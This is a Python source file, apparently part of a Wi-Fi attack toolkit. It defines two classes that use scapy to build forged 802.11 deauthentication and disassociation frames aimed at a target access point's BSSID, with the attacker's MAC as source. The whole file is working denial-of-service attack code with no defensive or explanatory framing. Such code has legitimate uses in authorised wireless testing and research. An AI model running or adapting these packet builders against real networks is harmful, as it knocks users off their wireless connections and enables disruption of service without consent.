"""
Deauthentication attack implementation.
"""

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth
from .base_attack import BaseAttack


class DeauthAttack(BaseAttack):
    """Deauthentication attack implementation."""
    
    def _create_packet(self) -> Packet:
        """Create deauthentication packet."""
        if not self._config.target_bssid:
            return None
        
        # Create deauthentication packet
        packet = (
            RadioTap() /
            Dot11(
                addr1=self._config.target_bssid,  # Destination (AP)
                addr2=self._get_source_mac(),     # Source (attacker)
                addr3=self._config.target_bssid   # BSSID
            ) /
            Dot11Deauth(reason=7)  # Class 3 frame received from unauthenticated STA
        )
        
        return packet


class DisassocAttack(BaseAttack):
    """Disassociation attack implementation."""
    
    def _create_packet(self) -> Packet:
        """Create disassociation packet."""
        if not self._config.target_bssid:
            return None
        
        # Create disassociation packet
        packet = (
            RadioTap() /
            Dot11(
                addr1=self._config.target_bssid,  # Destination (AP)
                addr2=self._get_source_mac(),     # Source (attacker)
                addr3=self._config.target_bssid   # BSSID
            ) /
            Dot11Disas(reason=7)  # Class 3 frame received from unassociated STA
        )
        
        return packet 